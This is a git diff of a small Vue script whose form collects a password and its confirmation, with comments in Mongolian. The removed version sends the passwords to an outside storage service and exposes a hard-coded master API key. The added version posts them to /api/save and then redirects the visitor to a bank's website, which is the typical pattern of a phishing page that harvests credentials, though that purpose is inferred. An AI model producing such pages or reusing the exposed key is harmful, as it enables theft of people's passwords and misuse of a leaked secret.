@@ -13,31 +13,30 @@ const confirmPassword = ref("")
 
 const url = '/api'
 
-const submit = () => {
-    
-    const payload = {
-        password: password.value,
-        confirmPassword: confirmPassword.value
-    }
+const submit = async () => {
+  const payload = {
+    password: password.value,
+    confirmPassword: confirmPassword.value
+  }
 
-    fetch(url, {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json',
-        method: "POST",
-        'x-master-key': '$2a$10$LCChQA80Y8vUnGk7.ssgr.lEAJtloz.axGEuaz0PVRlkFM9Al0wNu', // 👉 өөрийн API key
-        'X-Bin-Private': 'false'
-    },
-    body: JSON.stringify(payload)
+  try {
+    const res = await fetch('/api/save', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
     })
-    .then(res => res.json())
-    .then(data => {
-        console.log('Response:', data)
-        alert("Амжилттай, таньд баярлалаа")
-    })
-    .catch(err => {
-        console.error('Error:', err)
-    })
+
+    const data = await res.json()
+    console.log('Response:', data)
+
+    // 👉 зөвхөн амжилттай бол redirect
+    window.location.href = 'https://transbank.mn'
+
+  } catch (err) {
+    console.error('Error:', err)
+  }
 }
 </script>
 
